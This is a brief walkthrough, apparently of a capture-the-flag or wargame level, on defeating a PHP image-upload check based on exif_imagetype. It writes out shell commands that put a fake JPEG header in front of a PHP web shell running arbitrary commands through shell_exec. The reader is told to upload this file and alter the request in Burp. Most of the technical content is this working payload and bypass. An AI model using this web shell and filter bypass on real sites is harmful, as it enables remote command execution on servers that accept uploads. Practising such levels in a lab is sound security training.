![image](https://github.com/user-attachments/assets/519ceded-9a5a-4d55-99f5-4157f643f83a)

exif_imagetype($_FILES['uploadedfile']['tmp_name'])
this line in the php script above will check if the given file has valid header.
It checks whether the uploaded file is a valid image, based on its magic bytes (i.e., the file signature), not just its extension.
So now, just changing the file extension to .php won’t work.


We can put fake jpeg headed onto php script to bypass this filter.

# Create fake JPEG header (FF D8 FF E0)
echo -ne '\xFF\xD8\xFF\xE0' > shell.php

# Append your PHP payload
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" >> shell.php

Upload the shell.php and also change the line in the request like how we did in the previous level using burp.
![image](https://github.com/user-attachments/assets/fe4b101e-d96d-456c-9cbd-b993e853270d)


![image](https://github.com/user-attachments/assets/7f1d578b-4148-4948-8792-5b7824b823f0)

Thats it.
